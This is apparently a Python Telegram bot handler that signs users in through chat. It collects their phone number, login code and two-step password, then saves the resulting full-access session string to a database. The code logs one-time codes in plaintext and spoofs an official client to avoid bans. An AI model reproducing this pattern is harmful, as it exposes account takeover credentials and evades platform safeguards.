import logging
import os
import sys
from pyrogram import Client, filters
from pyrogram.enums import ParseMode
from pyrogram.errors import SessionPasswordNeeded
from database.database import save_user_session, get_user_session
from info import API_ID, API_HASH

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@Client.on_message(filters.command("login") & filters.private)
async def login(client, message):
    user_id = message.from_user.id

    logger.info(f"Login attempt initiated for user {user_id}.")

    # Check if the user is already logged in
    session = get_user_session(user_id)
    if session:
        logger.info(f"User {user_id} is already logged in.")
        await message.reply("You're already logged in!", parse_mode=ParseMode.HTML)
        return

    try:
        # Step 1: Request the phone number securely
        logger.info(f"Requesting phone number from user {user_id}.")
        await message.reply("<b>Enter your phone number with country code (e.g., +1234567890):</b>", parse_mode=ParseMode.HTML)
        phone = await client.ask(message.chat.id, "<b>Please provide your phone number:</b>", parse_mode=ParseMode.HTML)
        phone_number = phone.text.strip()
        logger.info(f"Received phone number from user {user_id}: {phone_number}")

        # Create a temporary client using official client parameters to avoid authorization bans
        user_client = Client(
            name=f"temp_session_{user_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True,
            device_model="PC 64bit",
            system_version="Windows 11",
            app_version="5.1.1 x64"
        )

        await user_client.connect()
        try:
            # Send the OTP to the verified phone number
            logger.info(f"Sending OTP to phone number {phone_number}.")
            sent = await user_client.send_code(phone_number)
            await message.reply("<b>Enter the code you received (e.g., 1 2 3 4 5):</b>", parse_mode=ParseMode.HTML)

            # Step 2: Extract the OTP input and strip spaces
            otp_msg = await client.ask(message.chat.id, "<b>Enter the OTP code:</b>", parse_mode=ParseMode.HTML)
            otp = otp_msg.text.replace(" ", "").strip()
            logger.info(f"Received OTP from user {user_id}: {otp}")

            # Step 3: Attempt authentication signature
            logger.info(f"Attempting to sign in user {user_id} with OTP.")
            try:
                await user_client.sign_in(phone_number, sent.phone_code_hash, otp)
            except SessionPasswordNeeded:
                # Step 4: Handle Two-Factor Authentication if active
                logger.info(f"Two-step verification enabled for user {user_id}. Requesting PIN.")
                await message.reply("<b>Two-step verification is enabled. Enter your 2FA password/PIN:</b>", parse_mode=ParseMode.HTML)
                pin_msg = await client.ask(message.chat.id, "<b>Please enter your 2-step PIN:</b>", parse_mode=ParseMode.HTML)
                await user_client.check_password(pin_msg.text.strip())
                logger.info(f"Two-step verification successful for user {user_id}.")

            # Step 5: Export active authorization string and write to MongoDB
            if await user_client.get_me():
                logger.info(f"Saving session for user {user_id}.")
                session_str = await user_client.export_session_string()
                save_user_session(user_id, session_str)
                
                logger.info(f"Login successful for user {user_id}. Executing hard process self-restart.")
                await message.reply("<b>✅ Login successful! The engine process is restarting now to safely spin up your background forwarder daemon...</b>", parse_mode=ParseMode.HTML)
                
                # Gracefully close connections before dropping process memory space
                await user_client.disconnect()
                
                # Execute hard terminal process replacement to cleanly load the new user session
                os.execv(sys.executable, [sys.executable] + sys.argv)
                
        finally:
            if user_client.is_connected:
                await user_client.disconnect()

    except Exception as e:
        logger.error(f"Login failed for user {user_id}: {e}")
        await message.reply(f"<b>❌ Login failed:</b> {e}", parse_mode=ParseMode.HTML)
